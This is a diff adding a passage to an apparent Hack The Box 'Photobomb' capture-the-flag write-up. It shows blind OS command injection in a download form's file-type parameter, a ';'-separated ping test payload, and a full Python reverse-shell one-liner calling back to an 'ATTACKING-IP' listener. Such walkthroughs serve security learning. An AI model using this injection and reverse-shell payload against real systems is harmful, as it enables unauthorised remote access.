@@ -80,4 +80,39 @@ Use this credentials `pH0t0:b0Mb!` to bypass that popup.
 
 ![image](/assets/img/htb/photobomb/pass.png)
 
+After logging in, I only found a download function, and now I'm going to test it.
+
+![image](/assets/img/htb/photobomb/download.png)
+
+Capture the request by burp, Send to repeater and Play in parameters.
+
+The first thing that came to my mind after seeing a request is to try to test the `OS Command Injection` vulnerability in all parameters to find out which parameter is at vulnerable.
+
+The vulnerable parameter is the file type you specified with that payload `; ping -c 10 10.10.11.182` and the result was waiting for the response for about 10 millis to know that this parameter was vulnerable to a `blind OS Command Injection` vulnerability.
+
+I've tried using a number of characters as command separators like `| , || , &` , but only those that have succeeded `;` .
+
+![image](/assets/img/htb/photobomb/burp.png)
+
+Use command injection to get reverse shell.
+
+I tried several payloads but only the [python-reverse-shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/) worked.
+
+```py
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Put that payload in that vulnerable parameter.
+
+![image](/assets/img/htb/photobomb/payload.png)
+
+Listen by netcat.
+
+![image](/assets/img/htb/photobomb/nc.png)
+
+Bingoo, I got the user flag.
+
+![image](/assets/img/htb/photobomb/user.png)
+
+# Privilege Escalation
 
